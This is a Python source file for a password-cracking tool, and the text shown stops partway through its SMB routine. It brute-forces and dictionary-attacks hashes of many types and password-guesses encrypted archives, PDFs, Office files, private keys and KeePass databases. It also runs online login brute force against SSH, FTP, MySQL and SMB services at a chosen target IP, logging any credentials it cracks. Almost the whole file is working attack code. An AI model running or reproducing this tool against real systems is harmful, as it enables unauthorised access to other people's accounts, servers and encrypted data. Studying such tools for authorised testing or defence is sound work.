import hashlib
import bcrypt
import itertools
import string
import multiprocessing
import argparse
import sys
import binascii
import hmac
import os
import zipfile
import requests
import time
import ftplib
import socket
import argparse
import argcomplete
import threading
import multiprocessing
import itertools
import string
import pymysql 
import pikepdf
import subprocess
import msoffcrypto
import io


from pykeepass import PyKeePass
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


counter = None
found_flag = None

try:
    from passlib.hash import sha256_crypt, sha512_crypt, md5_crypt, des_crypt, apr_md5_crypt
    from passlib.hash import bcrypt as passlib_bcrypt
except ImportError:
    print("Warning: passlib not installed. Some hash types will be unavailable.")
    passlib_available = False
else:
    passlib_available = True

try:
    import argon2
    from argon2 import PasswordHasher
    argon2_hasher = PasswordHasher()
except ImportError:
    argon2_hasher = None

try:
    import scrypt
except ImportError:
    scrypt = None

try:
    import rarfile
except ImportError:
    rarfile = None

CRACKED_PASSWORDS_LOG = "cracked_passwords.log"

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    
def md4_hash(input_bytes):
    return hashlib.new('md4', input_bytes).hexdigest()

def scrypt_hash(password, salt, n=16384, r=8, p=1, dklen=64):
    if scrypt is None:
        raise ValueError("scrypt module not installed")
    key = scrypt.hash(password.encode(), salt, N=n, r=r, p=p, buflen=dklen)
    return binascii.hexlify(key).decode()

def hmac_hash(hash_name, key, message):
    return hmac.new(key.encode(), message.encode(), getattr(hashlib, hash_name)).hexdigest()

def hash_string(input_bytes, hash_type, salt=None):
    hash_type = hash_type.lower()
    pw = input_bytes.decode('utf-8', errors='ignore')
    if hash_type == 'md5':
        return hashlib.md5(input_bytes).hexdigest()
    elif hash_type == 'sha1':
        return hashlib.sha1(input_bytes).hexdigest()
    elif hash_type == 'sha256':
        return hashlib.sha256(input_bytes).hexdigest()
    elif hash_type == 'sha512':
        return hashlib.sha512(input_bytes).hexdigest()
    elif hash_type == 'sha3_256':
        return hashlib.sha3_256(input_bytes).hexdigest()
    elif hash_type == 'sha3_512':
        return hashlib.sha3_512(input_bytes).hexdigest()
    elif hash_type == 'ripemd160':
        try:
            h = hashlib.new('ripemd160')
            h.update(input_bytes)
            return h.hexdigest()
        except Exception:
            raise ValueError("ripemd160 not supported on this system")
    elif hash_type == 'whirlpool':
        try:
            h = hashlib.new('whirlpool')
            h.update(input_bytes)
            return h.hexdigest()
        except Exception:
            raise ValueError("whirlpool not supported on this system")
    elif hash_type == 'ntlm':
        return md4_hash(input_bytes.encode('utf-16le'))
    elif hash_type == 'bcrypt':
        if salt is None:
            salt = bcrypt.gensalt()
        hashed = bcrypt.hashpw(input_bytes, salt)
        return hashed.decode()
    elif hash_type == 'bcrypt-passlib':
        if not passlib_available:
            raise ValueError("passlib not installed")
        return passlib_bcrypt.hash(pw)
    elif hash_type == 'md5-crypt':
        if not passlib_available:
            raise ValueError("passlib not installed")
        return md5_crypt.hash(pw)
    elif hash_type == 'sha256-crypt':
        if not passlib_available:
            raise ValueError("passlib not installed")
        return sha256_crypt.hash(pw)
    elif hash_type == 'sha512-crypt':
        if not passlib_available:
            raise ValueError("passlib not installed")
        return sha512_crypt.hash(pw)
    elif hash_type == 'argon2':
        if argon2_hasher is None:
            raise ValueError("argon2-cffi not installed")
        return argon2_hasher.hash(pw)
    elif hash_type == 'md5_salt_pass':
        if salt is None:
            raise ValueError("md5_salt_pass requires salt")
        return hashlib.md5((salt + pw).encode()).hexdigest()
    elif hash_type == 'md5_pass_salt':
        if salt is None:
            raise ValueError("md5_pass_salt requires salt")
        return hashlib.md5((pw + salt).encode()).hexdigest()
    elif hash_type == 'sha1_salt_pass':
        if salt is None:
            raise ValueError("sha1_salt_pass requires salt")
        return hashlib.sha1((salt + pw).encode()).hexdigest()
    elif hash_type == 'sha1_pass_salt':
        if salt is None:
            raise ValueError("sha1_pass_salt requires salt")
        return hashlib.sha1((pw + salt).encode()).hexdigest()
    elif hash_type == 'sha256_salt_pass':
        if salt is None:
            raise ValueError("sha256_salt_pass requires salt")
        return hashlib.sha256((salt + pw).encode()).hexdigest()
    elif hash_type == 'sha256_pass_salt':
        if salt is None:
            raise ValueError("sha256_pass_salt requires salt")
        return hashlib.sha256((pw + salt).encode()).hexdigest()
    elif hash_type == 'hmac_md5':
        if salt is None:
            raise ValueError("hmac_md5 requires key (salt)")
        return hmac_hash('md5', salt, pw)
    elif hash_type == 'hmac_sha1':
        if salt is None:
            raise ValueError("hmac_sha1 requires key (salt)")
        return hmac_hash('sha1', salt, pw)
    elif hash_type == 'hmac_sha256':
        if salt is None:
            raise ValueError("hmac_sha256 requires key (salt)")
        return hmac_hash('sha256', salt, pw)
    elif hash_type == 'hmac_sha512':
        if salt is None:
            raise ValueError("hmac_sha512 requires key (salt)")
        return hmac_hash('sha512', salt, pw)
    elif hash_type == 'scrypt':
        if salt is None:
            raise ValueError("scrypt requires salt")
        return scrypt_hash(pw, salt.encode())
    else:
        raise ValueError(f"Unsupported hash type: {hash_type}")

def run_hack_force(at_mode=1,target_hash=None,hash_type='md5',salt=None,max_length=6,processes=4,dictionary=None,verbose=False,zip2hack=None,rar2hack=None,show_pass=None,user=None,password_list=None,target_ip=None,HPF=None,ssh=False,ftp=False):

    salt_val = salt if salt else None

    if at_mode == 1:
        if not target_hash:
            print(f"{Colors.WARNING}[!]Error: target_hash is required in at_mode 1{Colors.ENDC}")
            return None
        if verbose:
            print(f"{Colors.WARNING}[-]Starting crack on single hash: {target_hash}{Colors.ENDC}")
        password = None
        if dictionary:
            password = dictionary_attack(target_hash, hash_type, dictionary, salt_val, verbose)
        if password is None:
            password = brute_force_parallel(target_hash, hash_type, salt_val, max_length=max_length, processes=processes, verbose=verbose)
        if password:
            print(f"{Colors.OKGREEN}[+] Cracked password: {password}{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[*] the cracked password saved in cracked_passwords.log{Colors.ENDC}")
            log_cracked_password(target_hash, password)
            return password
        else:
            print(f"{Colors.FAIL}[-] Failed to crack the hash.{Colors.ENDC}")
            return None

    elif at_mode == 2:
        if show_pass:
            show_cracked_passwords(show_pass)
            return None

        if zip2hack:
            if not verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on ZIP file: {zip2hack}{Colors.ENDC}")
            password = crack_archive(zip2hack, 'zip', dictionary, max_length=max_length, processes=processes, verbose=verbose)
            if password:
                print(f"{Colors.OKGREEN}[+] Cracked ZIP password: {password}{Colors.ENDC}")
                log_cracked_password(zip2hack, password)
                return password
            else:
                print(f"{Colors.FAIL}[-] Failed to crack ZIP password.{Colors.ENDC}")
                return None

        if rar2hack:
            if not rarfile:
                print(f"{Colors.WARNING}[!] rarfile module not installed, cannot crack RAR files.{Colors.ENDC}")
                return None
            if verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on RAR file: {rar2hack}{Colors.ENDC}")
            password = crack_archive(rar2hack, 'rar', dictionary, max_length=max_length, processes=processes, verbose=verbose)
            if password:
                print(f"{Colors.OKGREEN}[+] Cracked RAR password: {password}{Colors.ENDC}")
                log_cracked_password(rar2hack, password)
                return password
            else:
                print(f"{Colors.FAIL}[-] Failed to crack RAR password.{Colors.ENDC}")
                return None

    elif at_mode == 3:
        class Args:
            pass
        args = Args()
        args.user = user
        args.password_list = password_list
        args.target_ip = target_ip
        args.ssh = ssh
        args.ftp = ftp
        args.HPF = HPF
        args.verbose = verbose

        run_mode_3(args)
        return None

def check_password(password, target_hash, hash_type, salt=None, verbose=False):
    try:
        if hash_type in ['bcrypt', 'bcrypt-passlib']:
            if passlib_available and hash_type == 'bcrypt-passlib':
                from passlib.hash import bcrypt as passlib_bcrypt
                if passlib_bcrypt.verify(password, target_hash):
                    if verbose:
                        print(f"Password '{password}' matches bcrypt-passlib hash")
                    return True
            else:
                if bcrypt.checkpw(password.encode(), target_hash.encode()):
                    if verbose:
                        print(f"Password '{password}' matches bcrypt hash")
                    return True
            return False
        elif hash_type == 'argon2':
            if argon2_hasher is None:
                return False
            try:
                argon2_hasher.verify(target_hash, password)
                if verbose:
                    print(f"Password '{password}' matches argon2 hash")
                return True
            except argon2.exceptions.VerifyMismatchError:
                return False
        else:
            hashed = hash_string(password.encode(), hash_type, salt)
            if verbose:
                print(f"{Colors.OKCYAN}[*] Trying password: '{password}' -> {hashed}{Colors.ENDC}")
            if hashed == target_hash:
                return True
            hashed_nl = hash_string((password + '\n').encode(), hash_type, salt)
            if verbose:
                print(f"{Colors.OKCYAN}[*] Trying password with newline: '{password}\\n' -> {hashed_nl}{Colors.ENDC}")
            if hashed_nl == target_hash:
                return True
            return False
    except Exception as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Error checking password '{password}': {e}{Colors.ENDC}")
        return False

def dictionary_attack(target_hash, hash_type, wordlist_file, salt=None, verbose=False):
    with open(wordlist_file, 'r', encoding='latin-1') as f:
        for line in f:
            password = line.strip('\r\n')
            if check_password(password, target_hash, hash_type, salt, verbose):
                return password
    return None

def brute_force_worker(args):
    charset, max_length, target_hash, hash_type, salt, start_prefix, verbose = args
    for length in range(len(start_prefix), max_length + 1):
        for attempt in itertools.product(charset, repeat=length - len(start_prefix)):
            password = start_prefix + ''.join(attempt)
            if check_password(password, target_hash, hash_type, salt, verbose):
                return password
    return None

def brute_force_parallel(target_hash, hash_type='md5', salt=None,
                         charset=string.ascii_letters + string.digits + string.punctuation, max_length=6, processes=4, verbose=False):
    pool = multiprocessing.Pool(processes=processes)
    chunk_size = max(1, len(charset) // processes)
    args_list = []
    for i in range(processes):
        start = i * chunk_size
        end = (i + 1) * chunk_size if i != processes - 1 else len(charset)
        start_prefixes = charset[start:end]
        for prefix in start_prefixes:
            args_list.append((charset, max_length, target_hash, hash_type, salt, prefix, verbose))
    results = pool.map(brute_force_worker, args_list)
    pool.close()
    pool.join()
    for res in results:
        if res is not None:
            return res
    return None

def show_cracked_passwords(file_name):
    if not os.path.exists(CRACKED_PASSWORDS_LOG):
        print(f"{Colors.FAIL}[-] No cracked passwords log found.{Colors.ENDC}")
        return
    print(f"{Colors.OKGREEN}[+] Showing cracked passwords for {file_name}:{Colors.ENDC}")
    with open(CRACKED_PASSWORDS_LOG, 'r', encoding='utf-8') as f:
        for line in f:
            if line.startswith(file_name + ":"):
                print(line.strip())

def log_cracked_password(file_name, password):
    with open(CRACKED_PASSWORDS_LOG, 'a', encoding='utf-8') as f:
        f.write(f"{file_name}:{password}\n")

def try_zip_password(zip_path, password, verbose=False):
    try:
        with zipfile.ZipFile(zip_path) as zf:
            zf.extractall(pwd=password.encode())
        return True
    except RuntimeError as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for ZIP: {e}{Colors.ENDC}")
        return False
    except zipfile.BadZipFile as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Bad ZIP file: {e}{Colors.ENDC}")
        return False
    except Exception as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Error testing ZIP password '{password}': {e}{Colors.ENDC}")
        return False

def try_rar_password(rar_path, password, verbose=False):
    if rarfile is None:
        if verbose:
            print(f"{Colors.WARNING}[!] rarfile module not installed, cannot crack RAR files{Colors.ENDC}")
        return False
    try:
        with rarfile.RarFile(rar_path) as rf:
            rf.extractall(pwd=password)
        return True
    except rarfile.RarWrongPassword as e: # Bad Rar file!
        if verbose:
            print(f"{Colors.WARNING}[!] Bad RAR file: {e}{Colors.ENDC}")
        return False
    except rarfile.BadRarFile as e: # Rar Wrong Password!
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for RAR{Colors.ENDC}")
        return False
    except Exception as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Error testing RAR password '{password}': {e}{Colors.ENDC}")
        return False

def dictionary_attack_archive(archive_path, archive_type, wordlist_file, verbose=False, processes=1):
    with open(wordlist_file, 'r', encoding='latin-1') as f:
        passwords = [line.strip('\r\n') for line in f if line.strip()]
    total = len(passwords)
    for idx, password in enumerate(passwords, 1):
        if verbose:
            print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
        if archive_type == 'zip':
            success = try_zip_password(archive_path, password, verbose)
        elif archive_type == 'rar':
            success = try_rar_password(archive_path, password, verbose)
        else:
            success = False
        if success:
            if verbose:
                print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for {archive_type.upper()}{Colors.ENDC}")
            return password
    return None

def init_globals(c, f):
    global counter, found_flag
    counter = c
    found_flag = f

def brute_force_worker_archive(args):
    charset, max_length, archive_path, archive_type, start_prefix, verbose, total = args
    for length in range(len(start_prefix), max_length + 1):
        for attempt in itertools.product(charset, repeat=length - len(start_prefix)):
            if found_flag.value:
                return None
            password = start_prefix + ''.join(attempt)
            with counter.get_lock():
                counter.value += 1
                current = counter.value
            if verbose:
                print(f"{Colors.OKCYAN}[*] Trying password {current}/{total}: '{password}'{Colors.ENDC}")
            if archive_type == 'zip':
                if try_zip_password(archive_path, password, verbose):
                    found_flag.value = True
                    return password
            elif archive_type == 'rar':
                if try_rar_password(archive_path, password, verbose):
                    found_flag.value = True
                    return password
    return None

def brute_force_parallel_archive(archive_path, archive_type='zip',
                                charset=string.ascii_letters + string.digits + string.punctuation,
                                max_length=6, processes=4, verbose=False):
    total = sum(len(charset) ** length for length in range(1, max_length + 1))
    c = multiprocessing.Value('i', 0)
    f = multiprocessing.Value('b', False)
    pool = multiprocessing.Pool(processes=processes, initializer=init_globals, initargs=(c, f))
    chunk_size = max(1, len(charset) // processes)
    args_list = []
    for i in range(processes):
        start = i * chunk_size
        end = (i + 1) * chunk_size if i != processes - 1 else len(charset)
        start_prefixes = charset[start:end]
        for prefix in start_prefixes:
            args_list.append((charset, max_length, archive_path, archive_type, prefix, verbose, total))
    results = pool.map(brute_force_worker_archive, args_list)
    pool.close()
    pool.join()
    for res in results:
        if res is not None:
            return res
    return None

def try_pdf_password(pdf_path, password, verbose=False):
    try:
        with pikepdf.open(pdf_path, password=password):
            return True
    except pikepdf.PasswordError:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for PDF{Colors.ENDC}")
        return False
    except Exception as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Error testing PDF password '{password}': {e}{Colors.ENDC}")
        return False

def try_ssh_private_key_password(key_path, password, verbose=False):
    import paramiko
    try:
        key = paramiko.RSAKey.from_private_key_file(key_path, password=password)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for SSH private key{Colors.ENDC}")
        return True
    except paramiko.ssh_exception.PasswordRequiredException:
        if verbose:
            print(f"{Colors.WARNING}[!] Password required for SSH private key but none provided.{Colors.ENDC}")
        return False
    except paramiko.ssh_exception.SSHException:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for SSH private key{Colors.ENDC}")
        return False
    except Exception as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Error testing SSH private key password '{password}': {e}{Colors.ENDC}")
        return False

def try_gpg_password(gpg_path, password, verbose=False):
    try:
        cmd = ['gpg', '--batch', '--yes', '--passphrase', password, '-d', gpg_path]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        if result.returncode == 0:
            if verbose:
                print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for GPG file{Colors.ENDC}")
            return True
        else:
            if verbose:
                print(f"{Colors.FAIL}[-] Password '{password}' failed for GPG file{Colors.ENDC}")
            return False
    except subprocess.TimeoutExpired:
        if verbose:
            print(f"{Colors.WARNING}[!] Timeout testing password '{password}' for GPG file{Colors.ENDC}")
        return False
    except Exception as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Error testing GPG password '{password}': {e}{Colors.ENDC}")
        return False

def try_7z_password(archive_path, password, verbose=False):
    try:
        cmd = ['7z', 't', f'-p{password}', '-y', archive_path]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
        if result.returncode == 0:
            if verbose:
                print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for 7z archive{Colors.ENDC}")
            return True
        else:
            if verbose:
                print(f"{Colors.FAIL}[-] Password '{password}' failed for 7z archive{Colors.ENDC}")
            return False
    except subprocess.TimeoutExpired:
        if verbose:
            print(f"{Colors.WARNING}[!] Timeout testing password '{password}' for 7z archive{Colors.ENDC}")
        return False
    except Exception as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Error testing 7z password '{password}': {e}{Colors.ENDC}")
        return False

def try_rar5_password(archive_path, password, verbose=False):
    try:
        cmd = ['unrar', 't', f'-p{password}', archive_path]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
        if result.returncode == 0:
            if verbose:
                print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for RAR5 archive{Colors.ENDC}")
            return True
        else:
            if verbose:
                print(f"{Colors.FAIL}[-] Password '{password}' failed for RAR5 archive{Colors.ENDC}")
            return False
    except subprocess.TimeoutExpired:
        if verbose:
            print(f"{Colors.WARNING}[!] Timeout testing password '{password}' for RAR5 archive{Colors.ENDC}")
        return False
    except Exception as e:
        if verbose:
            print(f"{Colors.WARNING}[!] Error testing RAR5 password '{password}': {e}{Colors.ENDC}")
        return False

def try_doc_password(doc_path, password, verbose=False):
    try:
        with open(doc_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            if not office_file.is_encrypted():
                if verbose:
                    print(f"{Colors.WARNING}[!] Document is not password protected.{Colors.ENDC}")
                return False
            office_file.load_key(password=password)
            decrypted = io.BytesIO()
            office_file.decrypt(decrypted)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for document{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for document: {e}{Colors.ENDC}")
        return False

def try_docx_password(docx_path, password, verbose=False):
    try:
        with open(docx_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            if not office_file.is_encrypted():
                if verbose:
                    print(f"{Colors.WARNING}[!] Document is not password protected.{Colors.ENDC}")
                return False
            office_file.load_key(password=password)
            decrypted = io.BytesIO()
            office_file.decrypt(decrypted)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for DOCX file{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for DOCX file: {e}{Colors.ENDC}")
        return False

def try_xls_password(xls_path, password, verbose=False):
    try:
        with open(xls_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            if not office_file.is_encrypted():
                if verbose:
                    print(f"{Colors.WARNING}[!] Excel file is not password protected.{Colors.ENDC}")
                return False
            office_file.load_key(password=password)
            decrypted = io.BytesIO()
            office_file.decrypt(decrypted)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for Excel file{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for Excel file: {e}{Colors.ENDC}")
        return False

def try_xlsx_password(xlsx_path, password, verbose=False):
    try:
        with open(xlsx_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            if not office_file.is_encrypted():
                if verbose:
                    print(f"{Colors.WARNING}[!] XLSX file is not password protected.{Colors.ENDC}")
                return False
            office_file.load_key(password=password)
            decrypted = io.BytesIO()
            office_file.decrypt(decrypted)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for XLSX file{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for XLSX file: {e}{Colors.ENDC}")
        return False

def try_ppt_password(ppt_path, password, verbose=False):
    try:
        with open(ppt_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            if not office_file.is_encrypted():
                if verbose:
                    print(f"{Colors.WARNING}[!] PowerPoint file is not password protected.{Colors.ENDC}")
                return False
            office_file.load_key(password=password)
            decrypted = io.BytesIO()
            office_file.decrypt(decrypted)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for PowerPoint file{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for PowerPoint file: {e}{Colors.ENDC}")
        return False

def try_pptx_password(pptx_path, password, verbose=False):
    try:
        with open(pptx_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            if not office_file.is_encrypted():
                if verbose:
                    print(f"{Colors.WARNING}[!] PPTX file is not password protected.{Colors.ENDC}")
                return False
            office_file.load_key(password=password)
            decrypted = io.BytesIO()
            office_file.decrypt(decrypted)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for PPTX file{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for PPTX file: {e}{Colors.ENDC}")
        return False

def try_pem_password(pem_path, password, verbose=False):
    try:
        with open(pem_path, 'rb') as f:
            pem_data = f.read()
        private_key = serialization.load_pem_private_key(
            pem_data,
            password=password.encode('utf-8'),
            backend=default_backend()
        )
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for PEM file{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for PEM file: {e}{Colors.ENDC}")
        return False

def try_kdb_password(kdb_path, password, verbose=False):
    try:
        kp = PyKeePass(kdb_path, password=password)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for KeePass kdb file{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for KeePass kdb file: {e}{Colors.ENDC}")
        return False

def try_kdbx_password(kdbx_path, password, verbose=False):
    try:
        kp = PyKeePass(kdbx_path, password=password)
        if verbose:
            print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for KeePass kdbx file{Colors.ENDC}")
        return True
    except Exception as e:
        if verbose:
            print(f"{Colors.FAIL}[-] Password '{password}' failed for KeePass kdbx file: {e}{Colors.ENDC}")
        return False

def crack_archive(archive_path, archive_type, dictionary_file=None, verbose=False, processes=1):
    if dictionary_file:
        with open(dictionary_file, 'r', encoding='latin-1') as f:
            passwords = [line.strip('\r\n') for line in f if line.strip()]
        total = len(passwords)
        for idx, password in enumerate(passwords, 1):
            if verbose:
                print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
            if archive_type == 'zip':
                success = try_zip_password(archive_path, password, verbose)
            elif archive_type == 'rar':
                success = try_rar_password(archive_path, password, verbose)
            elif archive_type == 'pdf':
                success = try_pdf_password(archive_path, password, verbose)
            else:
                success = False
            if success:
                if verbose:
                    print(f"{Colors.OKGREEN}[+] Password '{password}' succeeded for {archive_type.upper()}{Colors.ENDC}")
                return password
        return None
    else:
        if verbose:
            print(f"{Colors.WARNING}[!] No dictionary file provided, brute force not implemented for {archive_type.upper()}.{Colors.ENDC}")
        return None

def run_mode_3(args):
    if not (args.user and args.password_list and args.target_ip):
        print("Error: --user, --password-list, and --target-ip are required for at_mode 3")
        import sys
        sys.exit(1)

    import os
    user_arg = args.user
    if os.path.isfile(user_arg):
        with open(user_arg, 'r', encoding='latin-1') as f:
            user_list = [line.strip() for line in f if line.strip()]
    else:
        user_list = [user_arg]

    with open(args.password_list, 'r', encoding='latin-1') as f:
        pass_list = [line.strip() for line in f if line.strip()]

    if args.ssh:
        user, password = ssh_bruteforce(args.target_ip, user_list, pass_list, args.verbose)
    elif args.ftp:
        user, password = ftp_bruteforce(args.target_ip, user_list, pass_list, args.verbose)
    elif args.mysql:
        user, password = mysql_bruteforce(args.target_ip, user_list, pass_list, args.verbose)
    elif args.smb:
        user, password = smb_bruteforce(args.target_ip, user_list, pass_list, args.verbose)
    else:
        print(f"{Colors.WARNING}[!] Error: You must specify one of --ssh, --ftp, --mysql or --smb for at_mode 3.{Colors.ENDC}")
        import sys
        sys.exit(1)

    if user and password:
        print(f"{Colors.OKGREEN}[+] Cracked credentials: {user}:{password}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] the cracked password saved in cracked_passwords.log{Colors.ENDC}")
        log_cracked_password(f"{args.target_ip}", f"{user}:{password}")
    else:
        print(f"{Colors.FAIL}[-] Failed to crack credentials.{Colors.ENDC}")

def ssh_bruteforce(target_ip, user_list, pass_list, verbose=False, timeout=5):
    import paramiko
    import socket
    import time

    paramiko.util.logging.getLogger().setLevel(paramiko.util.logging.WARNING)

    total_passwords = len(pass_list)
    for user in user_list:
        user = user.strip()
        print(f"{Colors.HEADER}[*] Starting brute-force for user: {user}{Colors.ENDC}")
        for idx, password in enumerate(pass_list, 1):
            password = password.strip()
            attempts = 0
            while attempts < 3:
                try:
                    if verbose:
                        print(f"{Colors.OKCYAN}[*] Trying SSH {user}:{password}@{target_ip} ({idx}/{total_passwords}), attempt {attempts+1}{Colors.ENDC}")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target_ip, username=user, password=password, timeout=timeout, allow_agent=False, look_for_keys=False)
                    if verbose:
                        print(f"{Colors.OKGREEN}[+] SSH Success: {user}:{password}{Colors.ENDC}")
                    ssh.close()
                    return user, password
                except paramiko.AuthenticationException:
                    if verbose:
                        print(f"{Colors.FAIL}[-] SSH Authentication failed for {user}:{password} ({idx}/{total_passwords}){Colors.ENDC}")
                    break  
                except (socket.timeout, socket.error, paramiko.SSHException) as e:
                    if verbose:
                        print(f"{Colors.WARNING}[!] SSH connection error on attempt {attempts+1}: {e}{Colors.ENDC}")
                    attempts += 1
                    time.sleep(1)
                    if attempts == 3 and verbose:
                        print(f"{Colors.WARNING}[!] Skipping password {password} after 3 failed connection attempts.{Colors.ENDC}")
                except Exception as e:
                    if verbose:
                        print(f"{Colors.WARNING}[!] Unexpected SSH error: {e}{Colors.ENDC}")
                    break
        print(f"{Colors.WARNING}[!] Finished all passwords for user {user} without success.{Colors.ENDC}")
    return None, None

def ftp_bruteforce(target_ip, user_list, pass_list, verbose=False, timeout=5):
    import ftplib
    import socket
    import time

    total_passwords = len(pass_list)
    for username in user_list:
        username = username.strip()
        print(f"{Colors.HEADER}[*] Starting FTP brute-force for user: {username}{Colors.ENDC}")
        for idx, password in enumerate(pass_list, 1):
            password = password.strip()
            attempts = 0
            while attempts < 3:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target_ip, 21, timeout=timeout)
                    ftp.login(user=username, passwd=password)
                    if verbose:
                        print(f"{Colors.OKGREEN}[+] FTP login successful: {username}:{password}{Colors.ENDC}")
                    ftp.quit()
                    return username, password
                except ftplib.error_perm:
                    if verbose:
                        print(f"{Colors.FAIL}[-] FTP login failed for {username}:{password} ({idx}/{total_passwords}){Colors.ENDC}")
                    break  
                except (socket.timeout, ConnectionRefusedError, socket.error) as e:
                    if verbose:
                        print(f"{Colors.WARNING}[!] Connection error on attempt {attempts+1}: {e}{Colors.ENDC}")
                    attempts += 1
                    time.sleep(1)
                    if attempts == 3:
                        if verbose:
                            print(f"{Colors.WARNING}[!] Skipping password {password} after 3 failed connection attempts.{Colors.ENDC}")
                except Exception as e:
                    if verbose:
                        print(f"{Colors.WARNING}[!] Unexpected error: {e}{Colors.ENDC}")
                    break  
    print(f"{Colors.WARNING}[!] Finished all passwords for user {username} without success.{Colors.ENDC}")
    return None, None

def mysql_bruteforce(target_ip, user_list, pass_list, verbose=False, port=3306, timeout=5):
    import pymysql
    for username in user_list:
        username = username.strip()
        print(f"{Colors.HEADER}[*] Starting MySQL brute-force for user: {username}{Colors.ENDC}")
        for idx, password in enumerate(pass_list, 1):
            password = password.strip()
            attempts = 0
            while attempts < 3:
                try:
                    if verbose:
                        print(f"{Colors.OKCYAN}[*] Trying MySQL {username}:{password}@{target_ip}:{port} ({idx}/{len(pass_list)}), attempt {attempts+1}{Colors.ENDC}")
                    conn = pymysql.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=timeout)
                    if verbose:
                        print(f"{Colors.OKGREEN}[+] MySQL login successful: {username}:{password}{Colors.ENDC}")
                    conn.close()
                    return username, password
                except pymysql.err.OperationalError as e:
                    if e.args[0] == 1045:
                        if verbose:
                            print(f"{Colors.FAIL}[-] MySQL Authentication failed for {username}:{password} ({idx}/{len(pass_list)}){Colors.ENDC}")
                        break
                    else:
                        if verbose:
                            print(f"{Colors.WARNING}[!] MySQL operational error on attempt {attempts+1}: {e}{Colors.ENDC}")
                        attempts += 1
                        time.sleep(1)
                except (socket.timeout, socket.error) as e:
                    if verbose:
                        print(f"{Colors.WARNING}[!] Connection error on attempt {attempts+1}: {e}{Colors.ENDC}")
                    attempts += 1
                    time.sleep(1)
                except Exception as e:
                    if verbose:
                        print(f"{Colors.WARNING}[!] Unexpected MySQL error: {e}{Colors.ENDC}")
                    break
            if attempts == 3 and verbose:
                print(f"{Colors.WARNING}[!] Skipping password {password} after 3 failed connection attempts.{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Finished all passwords for user {username} without success.{Colors.ENDC}")
    return None, None

def smb_bruteforce(target_ip, user_list, pass_list, verbose=False, timeout=5):
    from smb.SMBConnection import SMBConnection
    import socket
    import time

    for username in user_list:
        username = username.strip()
        print(f"{Colors.HEADER}[*] Starting SMB brute-force for user: {username}{Colors.ENDC}")
        for idx, password in enumerate(pass_list, 1):
            password = password.strip()
            attempts = 0
            while attempts < 3:
                try:
                    if verbose:
                        print(f"{Colors.OKCYAN}[*] Trying SMB {username}:{password}@{target_ip} ({idx}/{len(pass_list)}), attempt {attempts+1}{Colors.ENDC}")
